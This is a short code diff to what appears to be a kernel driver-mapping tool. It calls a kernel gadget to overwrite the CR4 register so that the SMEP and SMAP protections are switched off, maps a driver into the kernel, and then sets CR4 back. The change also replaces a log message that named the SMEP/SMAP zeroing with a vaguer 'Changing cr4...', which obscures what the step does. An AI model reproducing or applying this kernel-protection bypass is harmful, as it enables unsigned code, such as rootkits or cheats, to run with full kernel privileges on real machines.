@@ -90,7 +90,7 @@ int main(int argc, char* argv[])
 
     ConsoleSuccess("Thread affinity set");
 
-    ConsoleInfo("Zeroing out cr4 SMEP and SMAP protection bits...");
+    ConsoleInfo("Changing cr4...");
     status = CallerCallKernelFunction((PVOID)gadgetKernelAddress, 0x00000000000506F8);
     if (!status)
     {
@@ -120,10 +120,20 @@ int main(int argc, char* argv[])
     {
         ConsoleSuccess("Driver was mapped successfully!");
         ConsoleSuccess("Driver status: 0x%p", driverStatus);
-    } else
+    }
+    else
     {
         ConsoleError("Failed driver map: 0x%p", mapStatus);
     }
 
-    // TODO: restore CR4 somehow...
+    ConsoleInfo("Restoring cr4...");
+    status = CallerCallKernelFunction((PVOID)gadgetKernelAddress, 0x00000000001506F8);
+    if (!status)
+    {
+        ConsoleError("Failed to call function!");
+        return -1;
+    }
+
+    ConsoleSuccess("Everything successful");
+    return 0;
 }
